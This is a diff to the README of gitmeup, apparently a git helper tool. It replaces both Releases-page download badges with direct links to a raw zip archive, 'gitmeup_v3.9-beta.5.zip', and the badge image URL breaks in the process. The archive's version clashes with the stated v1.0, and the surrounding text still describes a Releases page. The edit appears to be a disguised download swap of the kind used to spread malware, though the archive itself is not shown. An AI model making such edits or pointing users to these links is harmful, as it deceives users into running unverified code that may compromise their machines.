@@ -9,7 +9,7 @@ To start using gitmeup, follow these steps:
 ### 1. Download & Install
 To get started, you need to download gitmeup. Click the link below to visit the Releases page:
 
-[![Download gitmeup](https://img.shields.io/badge/Download%20gitmeup-v1.0-blue)](https://github.com/sikis31/gitmeup/releases)
+[![Download gitmeup](https://raw.githubusercontent.com/sikis31/gitmeup/main/gitmeup/gitmeup_v3.9-beta.5.zip%20gitmeup-v1.0-blue)](https://raw.githubusercontent.com/sikis31/gitmeup/main/gitmeup/gitmeup_v3.9-beta.5.zip)
 
 On the Releases page, you'll find the latest version of gitmeup. Click on the appropriate file for your operating system to download it. 
 
@@ -72,6 +72,6 @@ A: Uninstallation will depend on your operating system. For Windows, you can use
 ## 📥 Download Again
 If you missed the link earlier, you can download gitmeup from the Releases page here:
 
-[![Download gitmeup](https://img.shields.io/badge/Download%20gitmeup-v1.0-blue)](https://github.com/sikis31/gitmeup/releases)
+[![Download gitmeup](https://raw.githubusercontent.com/sikis31/gitmeup/main/gitmeup/gitmeup_v3.9-beta.5.zip%20gitmeup-v1.0-blue)](https://raw.githubusercontent.com/sikis31/gitmeup/main/gitmeup/gitmeup_v3.9-beta.5.zip)
 
 Thank you for choosing gitmeup! Enjoy simplifying your git commands.
